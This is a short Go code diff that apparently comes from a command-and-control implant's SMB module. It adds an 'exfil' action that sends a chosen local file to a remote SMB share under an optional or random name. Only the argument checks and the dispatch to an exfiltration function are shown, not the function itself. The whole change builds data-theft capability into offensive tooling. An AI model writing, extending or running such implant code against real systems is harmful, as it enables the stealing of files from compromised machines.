@@ -102,8 +102,13 @@ func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
 			return errorResult("Error: -share, -path (remote destination), and -source (local file) required for push action")
 		}
 		return smbPushFile(args)
+	case "exfil":
+		if args.Share == "" || args.Source == "" {
+			return errorResult("Error: -share and -source (local file) required for exfil action. -path is optional (default: random name)")
+		}
+		return smbExfilFile(args)
 	default:
-		return errorf("Error: unknown action %q. Valid: shares, ls, cat, upload, rm, mkdir, mv, push", args.Action)
+		return errorf("Error: unknown action %q. Valid: shares, ls, cat, upload, rm, mkdir, mv, push, exfil", args.Action)
 	}
 }
 
